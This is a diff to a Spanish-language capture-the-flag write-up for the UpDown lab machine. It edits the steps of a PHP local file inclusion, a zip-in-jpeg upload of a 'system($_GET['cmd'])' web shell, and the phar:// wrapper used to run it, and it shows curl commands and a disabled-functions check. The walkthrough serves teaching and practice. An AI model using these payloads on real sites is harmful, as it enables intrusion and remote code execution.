@@ -74,7 +74,7 @@ El codigo del repo que nos hemos bajado y que concierne a esta parte:
 ```php
 <b>This is only for developers</b>
 <a href="?page=admin">Admin Panel</a>
-<?php								   // Si en la raiz ponemos ?page=admin:
+<?php
     define("DIRECTACCESS",false);	
     $page=$_GET['page'];			// El contenido de la maquina que le pidamos por get a page
     if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){ 	// Mientras que no incluya estos patrones
@@ -84,11 +84,12 @@ El codigo del repo que nos hemos bajado y que concierne a esta parte:
 	// Si no ponemos ?page=admin nos carga checker.php
 ?>
 ```
-Por tanto si la url es: http://dev.siteisup.htb/?page=admin -> (mensaje cutre)  
+Por tanto si la url es: http://dev.siteisup.htb/?page=admin -> (mensaje simple "This is only for developers")
 Intentamos un LFI ya sabemos por el codigo de arriba que:
-- No podemos pedir nada que tenga -> /bin, usr, home, var, etc, i  
-- Lo que pidamos le pondra la extension php  
+- No podemos pedir nada que tenga -> /bin, usr, home, var, etc, i   
+- A lo que pidamos le pondra la extension php  
 - Si pedimos un php habra que poner el wrapper de codificacion en base64 porque si no lo interpreta.  
+- 
 ```console
 └─$ curl -s -H "Special-Dev: only4dev" http://dev.siteisup.htb/?page=php://filter/convert.base64-encode/resource=checker | tail -n 1
 PD9waHAKaWYoRElSRUNUQUNDRVNTKXsKCWRpZSgiQWNjZXNzIERlbmllZCIpOwp9Cj8+CjwhRE9DVFlQR...
@@ -98,8 +99,7 @@ El tema esque esos archivos php ya los tenemos gracias al repo asi que no es muy
 ------------------------------------------------
 # Part 4: File upload phar
 
-De no poner la url con el "page?" el codigo que entra en juego es checker.php
-
+De no poner la url con el "page?" el codigo que entra en juego es **checker.php**
 ```php
 <?php
 if($_POST['check']){
@@ -136,34 +136,35 @@ if($_POST['check']){
 ```
 Si subo una lista de webs como me piden (webs.txt):
 ```
-http://localhost:80
-http://10.10.14.14
-http://10.10.14.14/test.txt
+http://localhost:80  
+http://10.10.14.14  
+http://10.10.14.14/test.txt  
 ```
 Me llegan peticiones al igual que la web original:  
 - Si cambio a webs.php -> extension not allowed  
-En /uploads/ encuentro un archivo md5 pero esta vacio.  
-Si creamos un "<?php system($_GET['cmd']); ?>" y lo ponemos como shell.txt se sube pero obviamente no se ejecuta.  
+- En /uploads/ encuentro un archivo md5 pero esta vacio.   
+- Si creamos un "<?php system($_GET['cmd']); ?>" y lo ponemos como shell.txt se sube pero obviamente no se ejecuta. 
+
+Queda tirar de la vulnerabilidad "phar"
 ```console  
-└─$ zip shell.jpeg shell.php
-└─$ file shell.jpeg   
-shell.cucuxii: Zip archive data   # Aunque tenga la extension jpeg esto es un zip.
+└─$ zip shell.jpeg shell.php   # shell php -> <?php system($_GET[‘cmd’]); ?> 
+└─$ file shell.jpeg    # shell.cucuxii: Zip archive data   # Aunque tenga la extension jpeg esto es un zip.
 ```
-En /uploads aparece un nuevo directorio -> 1526e941f20f74050a82951a5bda79e2, ahi dentro está shell.jpeg  
+En /uploads aparece un nuevo directorio, ahi dentro está shell.jpeg  
 ![updown4](https://user-images.githubusercontent.com/96772264/215056204-2a60d2c2-4dab-41f3-9095-d4a337e0ae72.PNG)
 
 Si accedemos con el wrapper phar:// con el LFI al archivo de dentro (shell.php que es shell porque concatena ello solo el .php)  
-> phar://ruta_del_archivo_madre/archivo_hijo   
+> phar://ruta_del_archivo_madre(shell.jpeg)/archivo_hijo(shell)/     
 ```console
 └─$ curl -s -H "Special-Dev: only4dev" 'http://dev.siteisup.htb/?page=phar://uploads/1526e941f20f74050a82951a5bda79e2/shell.jpeg/shell' -I
 HTTP/1.0 500 Internal Server Error
 ```
 El error 500 se debe a que hay una funcion prohibida.  
-Si cambiamos su contenido a "<?php phpinfo(); ?>" y  repetimos el proceso tenemos el documento en la web:  
+Si cambiamos el contenido de shell.php a  ```<?php phpinfo(); ?>"``` y  repetimos el proceso tenemos el documento en la web:  
 
-Si copiamos las disabled functions las metemos en el archivo "disabled_functions" y con vim sustituimos las , por retorno de 
-carro -> ```:%s/,/\r/g``` acabamos con una lista bien clara de las funciones prohibidas entre las que estan system,
-exec o shell_exec entre todas.  
+Si copiamos las disabled functions las metemos en el archivo "disabled_functions" y con vim sustituimos las , por retorno de  carro -> ```:%s/,/\r/g```
+Acabamos con una lista bien clara de las funciones prohibidas entre las que estan system, exec o shell_exec entre todas.  
+
 ![updown5](https://user-images.githubusercontent.com/96772264/215056216-ec6cf51c-dfee-4718-8bf7-5e6c777f43f8.PNG)
 
 Esta es una lista de las funciones que nos permiten ejecutar comandos (lo metemos en un archivo llamado dangerous)
